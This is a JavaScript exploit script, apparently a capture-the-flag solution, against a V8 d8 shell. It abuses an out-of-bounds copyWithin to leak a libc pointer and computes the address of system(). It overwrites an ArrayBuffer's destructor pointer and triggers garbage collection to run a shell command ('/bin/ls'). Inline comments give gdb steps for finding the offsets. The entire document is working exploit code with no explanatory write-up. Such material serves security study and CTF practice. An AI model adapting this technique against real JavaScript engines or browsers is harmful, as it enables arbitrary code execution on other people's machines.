//https://scc-luhack.lancs.ac.uk/writeups/view/vvvv8

function exploit() {
	var buffers = [];
	for (var i = 0; i < 49; i++) {
		var b = new ArrayBuffer(24);
		var u = new Uint8Array(b);
		u.fill(i);
		buffers.push(b);
	}


	var buf = new ArrayBuffer(64);

	for (var i = 51; i < 90; i++) {
		var b = new ArrayBuffer(24);
		var u = new Uint8Array(b);
		u.fill(i);
		buffers.push(b);
	}

	//gdb ./d8
	//run --allow-natives-syntax --shell test.js
	//%DebugPrint(buf)
	//Contrl+C and tele <Address of BackingStore> 20
	//Observe the libc and destructor offset

	var view = new Uint8Array(buf);

	var close_to_libc_offset = 192 / 8;
	var destrutor_offset = 104 / 8;

	var u64view = new BigUint64Array(buf);

	view.copyWithin(0, close_to_libc_offset, close_to_libc_offset + 8, 8);
	var libcptr = u64view[0];

	console.log(`libcptr: ${libcptr}`);

	var destrutor_offset = 104 / 8;

	var system_offset_from_libc = -0x39bab0n;

	// one out of ten times this is correct
	var random_offset = 0x0n; //0xa000n;

	//var system_addr = libcptr + system_offset_from_libc - random_offset;
	
	var system_offset_me = 0x39bab0n;
	var system_offset_them = THEOFFSET;
	var offset_from_my_system = system_offset_them - system_offset_me;

	var system_addr = libcptr + system_offset_from_libc + offset_from_my_system - random_offset;
	console.log(`system_addr: ${system_addr}`);

	// write the address of system to the destructor of the 
	// buffer and set it's custom destructor flag

	view.copyWithin(0, destrutor_offset, destrutor_offset + 8, 8);
	u64view[0] = system_addr;
	u64view[2] = 0x40n | u64view[2];
	view.copyWithin(destrutor_offset, 0, 8, 8);

	var cmd = Uint8Array.from("/bin/ls\x00\x00".split('').map(c => c.charCodeAt(0)));
	view.set(cmd, 0);
}


function gc() {
	for (let i = 0; i < 20; i++)
		new ArrayBuffer(0x1000000);
}

exploit();
gc();
